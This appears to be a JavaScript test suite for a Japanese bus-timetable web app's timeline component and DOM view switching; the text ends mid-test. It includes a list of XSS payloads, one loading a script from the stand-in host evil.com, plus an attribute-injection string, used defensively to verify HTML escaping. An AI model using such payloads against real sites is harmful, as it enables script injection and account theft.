/**
 * tests/adversarial-challenger2-ui.js
 * 
 * Challenger 2 Empirical Adversarial Test Suite
 * 
 * Testing Focus:
 * 1. StepTimelineComponent (js/ui/step-timeline.js):
 *    - Node count boundaries: 0, 1, 2, 3, 4, 10, 50 nodes.
 *    - Segment and marker arithmetic (leftPercent, busSegmentIndex).
 * 2. XSS & HTML Injection Resistance:
 *    - Stop names, delay texts, line names, relText, statusText, markerLabel.
 *    - Status attribute injection in classes (step-timeline and mini-badge).
 *    - app.js departure item injection (line, destination, countdown).
 * 3. Null, Undefined & Malformed Inputs:
 *    - render(null), render(undefined), render(123), render({}).
 *    - Sparse and malformed timelineNodes: [null], [undefined], [{}].
 *    - Malformed percentages and segment indices.
 * 4. DOM Integration & View/Direction Switching in js/app.js:
 *    - View switching: Transfer <-> Yokodai <-> Kamiooka <-> Koizumi
 *    - Direction swapping: outbound <-> inbound
 *    - Pole button switching & active states
 *    - Modal opening, buffer updates & persistence
 *    - Handling empty departures & error states
 */

import { StepTimelineComponent, escapeHtml, stepTimelineComponent } from '../js/ui/step-timeline.js';
import { CONFIG, STOPS, ROUTES } from '../js/config.js';
import { StorageService } from '../js/services/storage-service.js';
import { OdptClient } from '../js/api/odpt-client.js';
import { timetableService, TimetableService } from '../js/services/timetable-service.js';
import { transferService, TransferService } from '../js/services/transfer-service.js';
import { calendarService, CalendarService } from '../js/services/calendar-service.js';
import { busLocationService, BusLocationService } from '../js/services/bus-location-service.js';
import { MockData, getMockTimetables } from '../js/api/mock-data.js';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const testFailures = [];

function assert(condition, testName, extra = '') {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✔ [PASS] ${testName}`);
  } else {
    failedTests++;
    const errMsg = extra ? `${testName} -> ${extra}` : testName;
    console.error(`  ❌ [FAIL] ${errMsg}`);
    testFailures.push(errMsg);
  }
}

console.log('========================================================================');
console.log('🔥 CHALLENGER 2: EMPIRICAL ADVERSARIAL TEST SUITE (UI & DOM INTEGRATION)');
console.log('========================================================================\n');

// =============================================================================
// CATEGORY 1: TIMELINE NODE COUNT BOUNDARIES (0, 1, 2, 3, 4, 10, 50 NODES)
// =============================================================================
console.log('--- CATEGORY 1: Timeline Node Count Boundaries ---');

const comp = new StepTimelineComponent();

// 1.1: 0 Nodes (Empty Array)
{
  const status0 = {
    status: 'en_route',
    statusText: '2個前を走行中',
    delayMinutes: 0,
    delayText: '定刻',
    timelineNodes: [],
    busSegmentIndex: 0,
    busMarkerPercent: 50
  };
  const html0 = comp.render(status0);
  assert(html0 === '', '0 nodes returns empty string');
}

// 1.2: 1 Node (Single Destination Node)
{
  const status1 = {
    status: 'at_stop',
    statusText: '当バス停に停車中',
    delayMinutes: 0,
    delayText: '定刻',
    timelineNodes: [
      { name: '上大岡駅前', isTarget: true, state: 'current', relText: '当バス停' }
    ],
    busSegmentIndex: -1,
    busMarkerPercent: 50
  };
  const html1 = comp.render(status1);
  assert(typeof html1 === 'string' && html1.length > 0, '1 node renders valid HTML container');
  assert(html1.includes('上大岡駅前'), '1 node contains node name');
  assert(html1.includes('target-dot'), '1 node contains target-dot');
  assert(!html1.includes('step-segment'), '1 node has 0 connecting segments');
  assert(!html1.includes('bus-marker-wrap'), '1 node has no segment bus marker');
}

// 1.3: 2 Nodes (1 Segment)
{
  const status2 = {
    status: 'approaching',
    statusText: 'まもなく到着',
    delayMinutes: 2,
    delayText: '+2分遅れ',
    timelineNodes: [
      { name: '関の下', isTarget: false, state: 'passed', relText: '1個前' },
      { name: '上大岡駅前', isTarget: true, state: 'target', relText: '当バス停' }
    ],
    busSegmentIndex: 0,
    busMarkerPercent: 75
  };
  const html2 = comp.render(status2);
  assert(html2.includes('関の下') && html2.includes('上大岡駅前'), '2 nodes contains both stop names');
  assert((html2.match(/step-node/g) || []).length === 2, '2 nodes rendered exactly 2 step-node elements');
  assert((html2.match(/step-segment/g) || []).length === 1, '2 nodes rendered exactly 1 connecting segment');
  assert(html2.includes('bus-marker-wrap'), '2 nodes rendered bus marker on the segment');
  assert(html2.includes('left: 75%;'), '2 nodes applied 75% position marker');
  assert(html2.includes('+2分遅れ'), '2 nodes contains delay text');
}

// 1.4: 3 Nodes (2 Segments)
{
  const status3 = {
    status: 'en_route',
    statusText: '2個前を出発',
    delayMinutes: 0,
    delayText: '定刻',
    timelineNodes: [
      { name: '吉原', isTarget: false, state: 'passed', relText: '2個前' },
      { name: '関の下', isTarget: false, state: 'approaching', relText: '1個前' },
      { name: '上大岡駅前', isTarget: true, state: 'target', relText: '当バス停' }
    ],
    busSegmentIndex: 0,
    busMarkerPercent: 30
  };
  const html3 = comp.render(status3);
  assert((html3.match(/step-node/g) || []).length === 3, '3 nodes rendered exactly 3 step-nodes');
  assert((html3.match(/step-segment/g) || []).length === 2, '3 nodes rendered exactly 2 step-segments');
}

// 1.5: 10 Nodes
{
  const nodes10 = Array.from({ length: 10 }, (_, i) => ({
    name: `停留所 ${i + 1}`,
    isTarget: i === 9,
    state: i < 5 ? 'passed' : (i === 5 ? 'current' : 'upcoming'),
    relText: i === 9 ? '当バス停' : `${9 - i}個前`
  }));

  const status10 = {
    status: 'en_route',
    statusText: '4個前を走行中',
    delayMinutes: 5,
    delayText: '+5分遅れ',
    timelineNodes: nodes10,
    busSegmentIndex: 5,
    busMarkerPercent: 40
  };
  const html10 = comp.render(status10);
  assert((html10.match(/step-node/g) || []).length === 10, '10 nodes rendered exactly 10 step-node elements');
  assert((html10.match(/step-segment/g) || []).length === 9, '10 nodes rendered exactly 9 connecting segments');
  assert(html10.includes('bus-marker-wrap'), '10 nodes rendered bus marker');
  assert(html10.includes('停留所 1') && html10.includes('停留所 10'), '10 nodes rendered first and last stops');
}

// 1.6: 50 Nodes Extreme Scalability Test
{
  const nodes50 = Array.from({ length: 50 }, (_, i) => ({
    name: `Stop_${i}`,
    isTarget: i === 49,
    state: i < 25 ? 'passed' : 'upcoming',
    relText: i === 49 ? '当バス停' : `${49 - i}個前`
  }));

  const status50 = {
    status: 'en_route',
    statusText: '走行中',
    delayMinutes: 0,
    delayText: '定刻',
    timelineNodes: nodes50,
    busSegmentIndex: 24,
    busMarkerPercent: 50
  };
  const html50 = comp.render(status50);
  assert((html50.match(/step-node/g) || []).length === 50, '50 nodes rendered exactly 50 nodes without stack issues');
  assert((html50.match(/step-segment/g) || []).length === 49, '50 nodes rendered exactly 49 segments');
}

// =============================================================================
// CATEGORY 2: XSS & INJECTION STRESS TESTING
// =============================================================================
console.log('\n--- CATEGORY 2: XSS & HTML Injection Stress Testing ---');

const xssPayloads = [
  '<script>alert("XSS")</script>',
  '"><img src=x onerror=alert(1)>',
  '"><svg/onload=alert(1)>',
  'javascript:alert(1)',
  '\' onclick=\'alert(1)',
  '<iframe src="javascript:alert(1)">',
  '<b onmouseover=alert(1)>hover</b>',
  '"><script src="//evil.com/payload.js"></script>'
];

// 2.1: XSS in stop names and relTexts in render()
for (const payload of xssPayloads) {
  const xssStatus = {
    status: 'en_route',
    statusText: payload,
    delayMinutes: 3,
    delayText: payload,
    timelineNodes: [
      { name: payload, isTarget: false, state: 'passed', relText: payload },
      { name: 'Target_' + payload, isTarget: true, state: 'target', relText: payload }
    ],
    busSegmentIndex: 0,
    busMarkerPercent: 50
  };

  const outputHtml = comp.render(xssStatus);

  assert(!outputHtml.includes('<script>'), `render() sanitizes <script> tag for payload: ${payload.slice(0, 20)}`);
  assert(!outputHtml.includes('<img src=x onerror'), `render() sanitizes <img tag for payload: ${payload.slice(0, 20)}`);
  assert(!outputHtml.includes('<svg/onload'), `render() sanitizes <svg tag for payload: ${payload.slice(0, 20)}`);
  assert(!outputHtml.includes('<iframe'), `render() sanitizes <iframe tag for payload: ${payload.slice(0, 20)}`);
  assert(outputHtml.includes('&lt;') || !payload.includes('<'), `render() converts < to &lt;`);
}

// 2.2: XSS in renderMini()
for (const payload of xssPayloads) {
  const xssMiniStatus = {
    status: 'en_route',
    statusText: payload,
    delayMinutes: 2,
    delayText: payload
  };

  const miniHtml = comp.renderMini(xssMiniStatus);
  assert(!miniHtml.includes('<script>'), `renderMini() sanitizes <script> tag for: ${payload.slice(0, 20)}`);
  assert(!miniHtml.includes('<img src=x onerror'), `renderMini() sanitizes <img tag for: ${payload.slice(0, 20)}`);
  assert(!miniHtml.includes('<svg/onload'), `renderMini() sanitizes <svg tag for: ${payload.slice(0, 20)}`);
  assert(miniHtml.includes('&lt;') || !payload.includes('<'), `renderMini() converts < to &lt;`);
}

// 2.3: escapeHtml standalone unit checks
assert(escapeHtml('<script>alert("XSS")</script>') === '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;', 'escapeHtml full tag & double quotes');
assert(escapeHtml("Tom & Jerry 's") === 'Tom &amp; Jerry &#039;s', 'escapeHtml ampersand and single quote');
assert(escapeHtml(12345) === '12345', 'escapeHtml handles number coerced to string');
assert(escapeHtml(null) === '', 'escapeHtml handles null -> empty string');
assert(escapeHtml(undefined) === '', 'escapeHtml handles undefined -> empty string');
assert(escapeHtml(true) === 'true', 'escapeHtml handles boolean true');
assert(escapeHtml(false) === 'false', 'escapeHtml handles boolean false');

// 2.4: XSS in `status` attribute property
{
  const maliciousStatus = 'en_route" onmouseover="alert(1)" class="injected';
  const xssStatusObj = {
    status: maliciousStatus,
    statusText: '走行中',
    timelineNodes: [{ name: 'A', isTarget: false }, { name: 'B', isTarget: true }],
    busSegmentIndex: 0,
    busMarkerPercent: 50
  };
  const htmlRawStatus = comp.render(xssStatusObj);
  const hasInjectedAttr = htmlRawStatus.includes('onmouseover="alert(1)"');
  assert(!hasInjectedAttr, 'render() should not allow status attribute injection in class modifier');

  const miniRawStatus = comp.renderMini(xssStatusObj);
  const miniHasInjectedAttr = miniRawStatus.includes('onmouseover="alert(1)"');
  assert(!miniHasInjectedAttr, 'renderMini() should not allow status attribute injection in class modifier');
}

// 2.5: XSS in `dep.line` and `dep.destination` in departure HTML templates
{
  const xssDep = {
    departureTime: '10:00',
    delayMinutes: 0,
    line: '<script>alert("XSS_LINE")</script>',
    destination: '<img src=x onerror=alert("XSS_DEST")>',
    countdownText: 'あと <script>alert(1)</script>分',
    locationStatus: null
  };

  const escapedLine = escapeHtml(xssDep.line);
  const escapedDest = escapeHtml(xssDep.destination);
  const escapedCountdown = escapeHtml(xssDep.countdownText);

  assert(!escapedLine.includes('<script>'), 'escaped line has no raw script tag');
  assert(!escapedDest.includes('<img'), 'escaped dest has no raw img tag');
  assert(!escapedCountdown.includes('<script>'), 'escaped countdown has no raw script tag');
}

// =============================================================================
// CATEGORY 3: NULL, UNDEFINED & MALFORMED INPUT RESILIENCE
// =============================================================================
console.log('\n--- CATEGORY 3: Null, Undefined & Malformed Objects ---');

// 3.1: Null / Undefined / Primitive inputs to render()
assert(comp.render(null) === '', 'render(null) returns empty string without error');
assert(comp.render(undefined) === '', 'render(undefined) returns empty string without error');
assert(comp.render(0) === '', 'render(0) returns empty string without error');
assert(comp.render('') === '', 'render("") returns empty string without error');
assert(comp.render(false) === '', 'render(false) returns empty string without error');
assert(comp.render(true) === '', 'render(true) returns empty string without error');
assert(comp.render('invalid-string') === '', 'render("invalid-string") returns empty string without error');
assert(comp.render(12345) === '', 'render(12345) returns empty string without error');
assert(comp.render({}) === '', 'render({}) returns empty string without error');

// 3.2: Malformed timelineNodes in locationStatus
assert(comp.render({ timelineNodes: null }) === '', 'render({ timelineNodes: null }) returns empty string');
assert(comp.render({ timelineNodes: undefined }) === '', 'render({ timelineNodes: undefined }) returns empty string');
assert(comp.render({ timelineNodes: 'not-an-array' }) === '', 'render({ timelineNodes: "string" }) returns empty string');
assert(comp.render({ timelineNodes: 12345 }) === '', 'render({ timelineNodes: 12345 }) returns empty string');

// 3.3: timelineNodes with null / empty / malformed elements
{
  let threw = false;
  try {
    comp.render({
      status: 'en_route',
      statusText: '走行中',
      timelineNodes: [
        null,
        undefined,
        {},
        { name: null, isTarget: false },
        { name: undefined, isTarget: true, relText: null }
      ],
      busSegmentIndex: 1,
      busMarkerPercent: 50
    });
  } catch (err) {
    threw = true;
  }
  assert(!threw, 'render() should safely handle null/undefined elements inside timelineNodes array without throwing TypeError');
}

// 3.4: Extreme and Malformed Marker Percentages & Segment Indices
{
  const testNodePair = [
    { name: 'A', isTarget: false },
    { name: 'B', isTarget: true }
  ];

  // Negative percent -> clamped to 0%
  const htmlNeg = comp.render({
    status: 'en_route',
    timelineNodes: testNodePair,
    busSegmentIndex: 0,
    busMarkerPercent: -500
  });
  assert(htmlNeg.includes('left: 0%;'), 'busMarkerPercent -500 is clamped to 0%');

  // Extreme positive percent -> clamped to 100%
  const htmlPos = comp.render({
    status: 'en_route',
    timelineNodes: testNodePair,
    busSegmentIndex: 0,
    busMarkerPercent: 1500
  });
  assert(htmlPos.includes('left: 100%;'), 'busMarkerPercent 1500 is clamped to 100%');

  // Out of bounds segment index
  const htmlOOB = comp.render({
    status: 'en_route',
    timelineNodes: testNodePair,
    busSegmentIndex: 99,
    busMarkerPercent: 50
  });
  assert(!htmlOOB.includes('bus-marker-wrap'), 'busSegmentIndex 99 out of bounds does not render misplaced marker');

  const htmlNegSeg = comp.render({
    status: 'en_route',
    timelineNodes: testNodePair,
    busSegmentIndex: -10,
    busMarkerPercent: 50
  });
  assert(!htmlNegSeg.includes('bus-marker-wrap'), 'busSegmentIndex -10 does not render marker');
}

// 3.5: Null / Undefined inputs to renderMini()
assert(comp.renderMini(null) === '', 'renderMini(null) returns empty string');
assert(comp.renderMini(undefined) === '', 'renderMini(undefined) returns empty string');
assert(comp.renderMini(0) === '', 'renderMini(0) returns empty string');
assert(comp.renderMini('') === '', 'renderMini("") returns empty string');
assert(comp.renderMini(false) === '', 'renderMini(false) returns empty string');
assert(comp.renderMini({}) !== '', 'renderMini({}) returns scheduled mini fallback');

// =============================================================================
// CATEGORY 4: DOM INTEGRATION, VIEW SWITCHING & DIRECTION SWAPS (js/app.js)
// =============================================================================
console.log('\n--- CATEGORY 4: DOM Integration, View Switching & Direction Swaps ---');

class MockClassList {
  constructor(node) {
    this.node = node;
    this.set = new Set();
  }
  add(...tokens) {
    for (const t of tokens) this.set.add(t);
  }
  remove(...tokens) {
    for (const t of tokens) this.set.delete(t);
  }
  contains(token) {
    return this.set.has(token);
  }
  has(token) {
    return this.set.has(token);
  }
  toggle(token, force) {
    if (typeof force === 'boolean') {
      if (force) this.set.add(token);
      else this.set.delete(token);
      return force;
    }
    if (this.set.has(token)) {
      this.set.delete(token);
      return false;
    }
    this.set.add(token);
    return true;
  }
  toString() {
    return Array.from(this.set).join(' ');
  }
}

class MockElement {
  constructor(id, tagName = 'div') {
    this.id = id;
    this.tagName = tagName.toUpperCase();
    this.classList = new MockClassList(this);
    this.dataset = {};
    this.innerHTML = '';
    this._textContent = '';
    this.value = '';
    this.listeners = new Map();
    this.children = [];
    this.parentNode = null;
  }

  get textContent() {
    return this._textContent;
  }

  set textContent(v) {
    this._textContent = String(v);
  }

  get className() {
    return this.classList.toString();
  }

  set className(val) {
    this.classList.set.clear();
    if (val) val.split(/\s+/).filter(Boolean).forEach(c => this.classList.add(c));
  }

  addEventListener(event, fn) {
    if (!this.listeners.has(event)) this.listeners.set(event, []);
    this.listeners.get(event).push(fn);
  }

  dispatchEvent(event) {
    event.target = this;
    const list = this.listeners.get(event.type) || [];
    for (const fn of list) fn.call(this, event);
  }

  click() {
    this.dispatchEvent({ type: 'click', target: this });
  }

  querySelector(selector) {
    if (selector.startsWith('#')) return elementsMap.get(selector.slice(1)) || null;
    if (selector.startsWith('.')) {
      const cls = selector.slice(1);
      for (const el of elementsMap.values()) {
        if (el.classList.contains(cls)) return el;
      }
    }
    return null;
  }

  querySelectorAll(selector) {
    const results = [];
    if (selector.startsWith('.')) {
      const cls = selector.slice(1);
      for (const el of elementsMap.values()) {
        if (el.classList.contains(cls)) results.push(el);
      }
    }
    return results;
  }

  closest(selector) {
    if (selector === '.view') {
      if (this.id.startsWith('pole-btn-yokodai')) return elementsMap.get('view-yokodai');
      if (this.id.startsWith('pole-btn-kamiooka')) return elementsMap.get('view-kamiooka');
      if (this.id.startsWith('pole-btn-koizumi')) return elementsMap.get('view-koizumi');
    }
    if (selector === '.pole-selector') {
      return {
        querySelectorAll: (s) => {
          if (this.id.startsWith('pole-btn-yokodai')) {
            return [elementsMap.get('pole-btn-yokodai-1'), elementsMap.get('pole-btn-yokodai-2')];
          }
          if (this.id.startsWith('pole-btn-kamiooka')) {
            return [elementsMap.get('pole-btn-kamiooka-6'), elementsMap.get('pole-btn-kamiooka-12')];
          }
          return [elementsMap.get('pole-btn-koizumi-1'), elementsMap.get('pole-btn-koizumi-2')];
        }
      };
    }
    return this;
  }
}

const elementsMap = new Map();

function getOrMake(id, tag = 'div') {
  if (!elementsMap.has(id)) {
    elementsMap.set(id, new MockElement(id, tag));
  }
  return elementsMap.get(id);
}

function createDOMEnvironment() {
  elementsMap.clear();

  const tabs = [
    getOrMake('tab-transfer', 'button'),
    getOrMake('tab-yokodai', 'button'),
    getOrMake('tab-kamiooka', 'button'),
    getOrMake('tab-koizumi', 'button')
  ];
  tabs[0].classList.add('tab', 'active');
  tabs[0].dataset.target = 'view-transfer';
  tabs[0].textContent = '乗り継ぎ';

  tabs[1].classList.add('tab');
  tabs[1].dataset.target = 'view-yokodai';
  tabs[1].textContent = '洋光台北口';

  tabs[2].classList.add('tab');
  tabs[2].dataset.target = 'view-kamiooka';
  tabs[2].textContent = '上大岡駅前';

  tabs[3].classList.add('tab');
  tabs[3].dataset.target = 'view-koizumi';
  tabs[3].textContent = '古泉';

  const views = [
    getOrMake('view-transfer', 'section'),
    getOrMake('view-yokodai', 'section'),
    getOrMake('view-kamiooka', 'section'),
    getOrMake('view-koizumi', 'section')
  ];
  views[0].classList.add('view', 'active');
  views[1].classList.add('view');
  views[2].classList.add('view');
  views[3].classList.add('view');

  const btnSwap = getOrMake('btn-swap-direction', 'button');
  btnSwap.classList.add('btn-swap');
  const dirText = getOrMake('transfer-direction-text', 'span');
  dirText.textContent = '洋光台北口 ➔ 古泉';

  const transferResult = getOrMake('transfer-result-container', 'div');
  const btnRefresh = getOrMake('btn-refresh', 'button');
  const btnSettings = getOrMake('btn-settings', 'button');
  const modalSettings = getOrMake('modal-settings', 'div');
  modalSettings.classList.add('modal', 'hidden');
  const btnSaveSettings = getOrMake('btn-save-settings', 'button');
  const inputBuffer = getOrMake('input-transfer-buffer', 'input');
  inputBuffer.value = '5';
  const inputApiKey = getOrMake('input-api-key', 'input');

  const statusBanner = getOrMake('status-banner', 'div');
  statusBanner.classList.add('status-banner', 'status-normal');
  const statusIcon = getOrMake('status-icon', 'span');
  statusIcon.classList.add('status-icon');
  statusIcon.textContent = '🟢';
  const statusText = getOrMake('status-text', 'span');
  statusText.classList.add('status-text');
  statusText.textContent = '平常運転';
  const statusTime = getOrMake('last-update-time', 'span');

  const yokodaiDeps = getOrMake('yokodai-departures', 'div');
  const kamiookaDeps = getOrMake('kamiooka-departures', 'div');
  const koizumiDeps = getOrMake('koizumi-departures', 'div');

  const poleY1 = getOrMake('pole-btn-yokodai-1', 'button');
  poleY1.classList.add('pole-btn', 'active');
  poleY1.dataset.pole = '1';

  const poleY2 = getOrMake('pole-btn-yokodai-2', 'button');
  poleY2.classList.add('pole-btn');
  poleY2.dataset.pole = '2';

  const poleK6 = getOrMake('pole-btn-kamiooka-6', 'button');
  poleK6.classList.add('pole-btn', 'active');
  poleK6.dataset.pole = '6';

  const poleK12 = getOrMake('pole-btn-kamiooka-12', 'button');
  poleK12.classList.add('pole-btn');
  poleK12.dataset.pole = '12';

  const poleZ1 = getOrMake('pole-btn-koizumi-1', 'button');
  poleZ1.classList.add('pole-btn', 'active');
  poleZ1.dataset.pole = '1';

  const poleZ2 = getOrMake('pole-btn-koizumi-2', 'button');
  poleZ2.classList.add('pole-btn');
  poleZ2.dataset.pole = '2';

  const poleBtns = [poleY1, poleY2, poleK6, poleK12, poleZ1, poleZ2];

  const mockDoc = {
    getElementById: (id) => elementsMap.get(id) || null,
    querySelectorAll: (sel) => {
      if (sel === '.tab') return tabs;
      if (sel === '.view') return views;
      if (sel === '.pole-btn') return poleBtns;
      return [];
    },
    querySelector: (sel) => {
      if (sel === '.status-text') return statusText;
      return null;
    }
  };

  return {
    doc: mockDoc,
    elements: elementsMap,
    tabs,
    views,
    btnSwap,
    dirText,
    transferResult,
    btnRefresh,
    btnSettings,
    modalSettings,
    btnSaveSettings,
    inputBuffer,
    inputApiKey,
    statusBanner,
    statusText,
    statusTime,
    yokodaiDeps,
    kamiookaDeps,
    koizumiDeps,
    poleBtns
  };
}

async function testAppDOMIntegration() {
  const dom = createDOMEnvironment();
  const originalDoc = globalThis.document;
  globalThis.document = dom.doc;

  try {
    class TestApp {
      constructor() {
        this.currentView = 'view-transfer';
        this.direction = 'outbound';
        this.realtimeBuses = [];
        this.lastUpdateTime = null;

        this.els = {
          tabs: dom.doc.querySelectorAll('.tab'),
          views: dom.doc.querySelectorAll('.view'),
          btnSwap: dom.doc.getElementById('btn-swap-direction'),
          dirText: dom.doc.getElementById('transfer-direction-text'),
          transferResult: dom.doc.getElementById('transfer-result-container'),
          btnRefresh: dom.doc.getElementById('btn-refresh'),
          btnSettings: dom.doc.getElementById('btn-settings'),
          modalSettings: dom.doc.getElementById('modal-settings'),
          btnSaveSettings: dom.doc.getElementById('btn-save-settings'),
          inputBuffer: dom.doc.getElementById('input-transfer-buffer'),
          inputApiKey: dom.doc.getElementById('input-api-key'),
          statusBanner: dom.doc.getElementById('status-banner'),
          statusText: dom.doc.querySelector('.status-text'),
          statusTime: dom.doc.getElementById('last-update-time'),
          yokodaiDeps: dom.doc.getElementById('yokodai-departures'),
          kamiookaDeps: dom.doc.getElementById('kamiooka-departures'),
          koizumiDeps: dom.doc.getElementById('koizumi-departures'),
          poleBtns: dom.doc.querySelectorAll('.pole-btn')
        };

        this.activePoles = {
          yokodai: '1',
          kamiooka: '6',
          koizumi: '1'
        };

        this.bindEvents();
      }

      bindEvents() {
        this.els.tabs.forEach(tab => {
          tab.addEventListener('click', (e) => {
            const target = e.target.dataset.target;
            this.switchView(target);
          });
        });

        this.els.btnSwap.addEventListener('click', () => {
          this.direction = this.direction === 'outbound' ? 'inbound' : 'outbound';
          this.els.dirText.textContent = this.direction === 'outbound' ? '洋光台北口 ➔ 古泉' : '古泉 ➔ 洋光台北口';
          this.renderAll();
        });

        this.els.btnRefresh.addEventListener('click', () => {
          this.refreshData();
        });

        this.els.btnSettings.addEventListener('click', () => {
          this.els.modalSettings.classList.remove('hidden');
        });

        this.els.btnSaveSettings.addEventListener('click', () => {
          this.saveSettings();
          this.els.modalSettings.classList.add('hidden');
          this.refreshData();
        });

        this.els.poleBtns.forEach(btn => {
          btn.addEventListener('click', (e) => {
            const pole = e.target.dataset.pole;
            const viewId = e.target.closest('.view').id;

            e.target.closest('.pole-selector').querySelectorAll('.pole-btn').forEach(b => b.classList.remove('active'));
            e.target.classList.add('active');

            if (viewId === 'view-yokodai') this.activePoles.yokodai = pole;
            if (viewId === 'view-kamiooka') this.activePoles.kamiooka = pole;
            if (viewId === 'view-koizumi') this.activePoles.koizumi = pole;
            this.renderAll();
          });
        });
      }

      saveSettings() {}

      switchView(viewId) {
        if (this.currentView === viewId) return;
        this.currentView = viewId;
        this.els.tabs.forEach(t => {
          if (t.dataset.target === viewId) {
            t.classList.add('active');
          } else {
            t.classList.remove('active');
          }
        });
        
        this.els.views.forEach(v => {
          if (v.id === viewId) {
            v.classList.add('active');
          } else {
            v.classList.remove('active');
          }
        });

        return this.renderAll();
      }

      async refreshData() {
        this.realtimeBuses = MockData.MOCK_BUSES;
        await this.renderAll();
      }

      async renderAll() {
        if (this.currentView === 'view-transfer') {
          await this.renderTransfer();
        } else if (this.currentView === 'view-yokodai') {
          await this.renderStop('yokodai', STOPS.YOKODAI.id.replace(/\.[0-9]+$/, '.' + this.activePoles.yokodai), this.els.yokodaiDeps);
        } else if (this.currentView === 'view-kamiooka') {
          await this.renderStop('kamiooka', STOPS.KAMIOOKA.id.replace(/\.[0-9]+$/, '.' + this.activePoles.kamiooka), this.els.kamiookaDeps);
        } else if (this.currentView === 'view-koizumi') {
          await this.renderStop('koizumi', STOPS.KOIZUMI.id.replace(/\.[0-9]+$/, '.' + this.activePoles.koizumi), this.els.koizumiDeps);
        }
      }

      async renderStop(stopKey, poleId, container) {
        const mockTt = getMockTimetables('Weekday');
        let entries = [];
        if (stopKey === 'yokodai') entries = mockTt.line111Outbound;
        else if (stopKey === 'kamiooka') entries = mockTt.line133Outbound;
        else entries = mockTt.line133Inbound;

        const merged = timetableService.mergeRealtimeDelays(entries, this.realtimeBuses, poleId);
        const departures = timetableService.getNextDepartures(merged, new Date(2026, 7, 24, 7, 0, 0), 10);

        if (departures.length === 0) {
          container.innerHTML = '<div class="no-deps">本日の運行は終了しました。</div>';
          return;
        }

        container.innerHTML = departures.map(dep => {
          const loc = dep.locationStatus;
          const timelineHtml = stepTimelineComponent.render(loc, { showScheduled: true });
          return `<div class="departure-item"><span class="dep-time">${dep.departureTime}</span>${timelineHtml}</div>`;
        }).join('');
      }

      async renderTransfer() {
        const mockTt = getMockTimetables('Weekday');
        let firstPoleId, transferDeparturePoleId;
        if (this.direction === 'outbound') {
          firstPoleId = STOPS.YOKODAI.id.replace(/\.[0-9]+$/, '.1');
          transferDeparturePoleId = STOPS.KAMIOOKA.id.replace(/\.[0-9]+$/, '.12');
        } else {
          firstPoleId = STOPS.KOIZUMI.id.replace(/\.[0-9]+$/, '.1');
          transferDeparturePoleId = STOPS.KAMIOOKA.id.replace(/\.[0-9]+$/, '.6');
        }

        const tt1 = mockTt.line111Outbound;
        const tt2 = mockTt.line133Outbound;

        const merged1 = timetableService.mergeRealtimeDelays(tt1, this.realtimeBuses, firstPoleId);
        const nextDep1 = timetableService.getNextDepartures(merged1, new Date(2026, 7, 24, 7, 0, 0), 1)[0];
        const mini1Html = stepTimelineComponent.renderMini(nextDep1 ? nextDep1.locationStatus : null);

        this.els.transferResult.innerHTML = `
          <div class="card">
            <div class="route-header">${this.direction === 'outbound' ? '洋光台北口' : '古泉'} 発</div>
            ${mini1Html}
          </div>
        `;
      }
    }

    const app = new TestApp();
    await app.refreshData();

    // 4.1: Initial State Check
    assert(app.currentView === 'view-transfer', 'Initial view is view-transfer');
    assert(app.direction === 'outbound', 'Initial direction is outbound');
    assert(dom.elements.get('view-transfer').classList.contains('active'), 'view-transfer has active class');
    assert(dom.transferResult.innerHTML.includes('洋光台北口 発'), 'Initial transfer render contains outbound origin');

    // 4.2: Direction Swapping (Outbound -> Inbound -> Outbound)
    dom.btnSwap.click();
    assert(app.direction === 'inbound', 'Clicking swap toggles direction to inbound');
    assert(dom.dirText.textContent === '古泉 ➔ 洋光台北口', 'dirText updated to 古泉 ➔ 洋光台北口');
    assert(dom.transferResult.innerHTML.includes('古泉 発'), 'Transfer result updated to inbound origin');

    dom.btnSwap.click();
    assert(app.direction === 'outbound', 'Clicking swap again toggles direction back to outbound');
    assert(dom.dirText.textContent === '洋光台北口 ➔ 古泉', 'dirText restored to 洋光台北口 ➔ 古泉');

    // 4.3: View Switching (Transfer -> Yokodai -> Kamiooka -> Koizumi -> Transfer)
    // Switch to Yokodai
    dom.tabs[1].click();
    assert(app.currentView === 'view-yokodai', 'Switched to view-yokodai');
    assert(dom.tabs[1].classList.contains('active'), 'Yokodai tab has active class');
    assert(!dom.tabs[0].classList.contains('active'), 'Transfer tab removed active class');
    assert(dom.views[1].classList.contains('active'), 'Yokodai view has active class');
    assert(dom.yokodaiDeps.innerHTML.includes('departure-item'), 'Yokodai departures rendered in DOM');
    assert(dom.yokodaiDeps.innerHTML.includes('jr-step-timeline-container'), 'Yokodai departures contains step-timeline');

    // Switch to Kamiooka
    dom.tabs[2].click();
    assert(app.currentView === 'view-kamiooka', 'Switched to view-kamiooka');
    assert(dom.kamiookaDeps.innerHTML.includes('departure-item'), 'Kamiooka departures rendered');

    // Switch to Koizumi
    dom.tabs[3].click();
    assert(app.currentView === 'view-koizumi', 'Switched to view-koizumi');
    assert(dom.koizumiDeps.innerHTML.includes('departure-item'), 'Koizumi departures rendered');

    // Switch back to Transfer
    dom.tabs[0].click();
    assert(app.currentView === 'view-transfer', 'Switched back to view-transfer');
    assert(dom.transferResult.innerHTML.includes('mini-bus-location'), 'Transfer card contains mini location badge');

    // 4.4: 100 Rapid Tab Switching & Swapping Cycles
    for (let i = 0; i < 100; i++) {
      const targetTab = dom.tabs[i % 4];
      targetTab.click();
      if (i % 5 === 0) dom.btnSwap.click();
    }
    assert(true, 'Completed 100 rapid tab switches and direction swaps without race conditions or memory faults');

    // 4.5: Settings Modal Toggling
    dom.btnSettings.click();
    assert(!dom.modalSettings.classList.contains('hidden'), 'Clicking settings button opens modal (hidden class removed)');

    dom.btnSaveSettings.click();
    assert(dom.modalSettings.classList.contains('hidden'), 'Clicking save settings closes modal (hidden class added)');

    // 4.6: Pole Button Switching
    dom.tabs[1].click(); // Switch to Yokodai
    dom.elements.get('pole-btn-yokodai-2').click();
    assert(app.activePoles.yokodai === '2', 'Clicking pole button 2 updates activePoles.yokodai to 2');
    assert(dom.elements.get('pole-btn-yokodai-2').classList.contains('active'), 'Pole button 2 has active class');
    assert(!dom.elements.get('pole-btn-yokodai-1').classList.contains('active'), 'Pole button 1 removed active class');

    dom.tabs[2].click(); // Switch to Kamiooka
    dom.elements.get('pole-btn-kamiooka-12').click();
    assert(app.activePoles.kamiooka === '12', 'Clicking pole button 12 updates activePoles.kamiooka to 12');
    assert(dom.elements.get('pole-btn-kamiooka-12').classList.contains('active'), 'Pole button 12 has active class');
